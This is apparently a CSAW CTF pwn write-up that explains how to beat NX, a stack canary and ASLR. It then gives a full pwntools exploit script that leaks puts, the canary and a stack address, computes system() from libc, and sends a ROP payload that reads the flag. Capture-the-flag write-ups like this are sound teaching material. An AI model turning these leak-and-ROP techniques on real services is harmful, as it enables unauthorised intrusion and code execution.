
Hello,

In this task we were given a binary file with NX activated, Canary present and ASLR enabled on the remote server.

The first function prints the address of puts function in libc. (-0x500).

The second function prints the canary and a part of a stack address (4 bytes).

With Libc given in addition to all these leaked informationwe can rebuild the process layout in memory and build our payload.

Below is the exploit I wrote to pwn the service, the script process as follows:


- Leak puts() address.
- Calculate system() address.
- Leak Canary value.
- Leak a Stack address.
- Calculate the receive buffer address.
- Place the command to be executed in recieve buffer.
- Place the canary
- ROP to system with recieve buffer address as argument.
- Put all together
- Enjoy !

<!--more-->
  
My exploit:

```python
from pwn import *
from struct import pack
from struct import unpack
import time


r = remote("pwn.chal.csaw.io", 8002)

r.recvuntil(">")
r.send("1\n")

r.recv()
puts =  int(r.recv()[:14],16) + 1280

print "[+] @puts : %x"%puts
r.send("2\n")

print r.recvuntil(">")

r.send("A"*310+"\n")
stack = r.recv()
print stack.encode("hex")
canary = stack[312:312+8]

print "[+] canary = "+canary.encode("hex")

print r.recvuntil(">")
r.send("2\n")

print r.recv()
print r.recv()


stackadd = 0x7ffc00000000 | unpack("I",stack[-4:])[0]

print "[+] stack add %x" %stackadd

#calc system address
libc = ELF('libc-2.19.so')
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_libc =  libc.symbols['puts']
print "[+] @puts in libc : %x"%puts_libc
deltasystem = libc.symbols['system'] - puts_libc
#deltasystem = -170752
print "[+] delta system: "+ str(deltasystem)

system = pack("<Q", puts + deltasystem)

print "[+] @system: %x"%(puts + deltasystem)

recvbuf = stackadd - 368
print "[+] recvbuf: %x"%recvbuf

junk = pack("<Q", 0xdeadbeef)
pop_rdi = 0x4012e3
#pop_rdi = 0xdeadbeef

cmdadd = pack("<Q",recvbuf + 64)

#all together
cmd = "D"*64
cmd +="cat flag.txt 1>&4 2>&4"+   "\x00"
payload = cmd+"C"*(312-len(cmd))+canary+"A"*8+pack("<Q",pop_rdi)+cmdadd+system+junk+"\n"
r.send(payload)
print r.recv()
print r.recv()
#r.interactive()

```

Cheers !
